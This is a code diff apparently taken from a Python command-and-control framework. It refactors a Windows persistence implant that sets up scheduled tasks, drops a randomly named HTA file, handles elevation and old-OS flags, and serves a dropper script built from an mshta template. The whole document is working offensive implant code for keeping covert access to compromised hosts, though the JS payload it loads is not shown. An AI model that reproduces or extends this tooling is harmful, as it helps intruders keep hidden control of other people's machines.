@@ -1,30 +1,40 @@
 import core.job
 import core.implant
+import core.loader
 import uuid
+import string
+import random
 
 class SchTasksJob(core.job.Job):
-
     def create(self):
         if self.session_id == -1:
             self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
             return False
-        if "XP" in self.session.os or "2003" in self.session.os:
-            self.script = self.script.replace(b"~NOFORCE~", b"true")
+        id = self.options.get("PAYLOAD")
+        payload = self.load_payload(id)
+        self.options.set("CMD", payload)
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
+        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
+
+        if self.options.get('DROPFILE'):
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
         else:
-            self.script = self.script.replace(b"~NOFORCE~", b"false")
+            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
+
+        if "XP" in self.session.os or "2003" in self.session.os:
+            self.options.set("NOFORCE", "true")
 
         if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
-            self.script = self.script.replace(b"~ELEVATED~", b"false")
-        else:
-            self.script = self.script.replace(b"~ELEVATED~", b"true")
+            self.options.set("ELEVATED", "false")
 
     def report(self, handler, data, sanitize = False):
         task = handler.get_header("Task", False)
         upload = handler.get_header('X-UploadFileJob', False)
         if upload == "true":
-            dropper_script = handler.loader.load_script(self.options.get("LDROPFILE"), self.options)
-            template = handler.loader.load_script("data/stager/js/mshta/template.hta")
-            fdata = handler.post_process_script(dropper_script, template, False)
+            dropper_script = core.loader.load_script(self.options.get("LDROPFILE"), self.options)
+            template = core.loader.load_script("data/stager/js/mshta/template.hta")
+            fdata = handler.post_process_script(dropper_script, template, self.options, self.session, False)
 
             headers = {}
             headers['Content-Type'] = 'application/octet-stream'
@@ -116,6 +126,8 @@ class SchTasksImplant(core.implant.Implant):
         self.options.register("RETRYDELAY", "60", "Seconds between retry attempts.")
         self.options.register("DROPFILE", "", "Name to give the drop file (randomly generated if no name).", advanced=True)
         self.options.register("FDROPFILE", "", "", hidden=True)
+        self.options.register("NOFORCE", "false", "", hidden=True)
+        self.options.register("ELEVATED", "true", "", hidden=True)
 
     def job(self):
         return SchTasksJob
@@ -128,19 +140,7 @@ class SchTasksImplant(core.implant.Implant):
             self.shell.print_error("Payload %s not found." % id)
             return
 
-        self.options.set("CMD", payload)
-        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
-
-        if self.options.get('DROPFILE'):
-            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
-        else:
-            import string
-            import random
-            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
-            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
-
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/persist/schtasks.js", self.options)
+        payloads["js"] = "data/implant/persist/schtasks.js"
 
         self.dispatch(payloads, self.job)
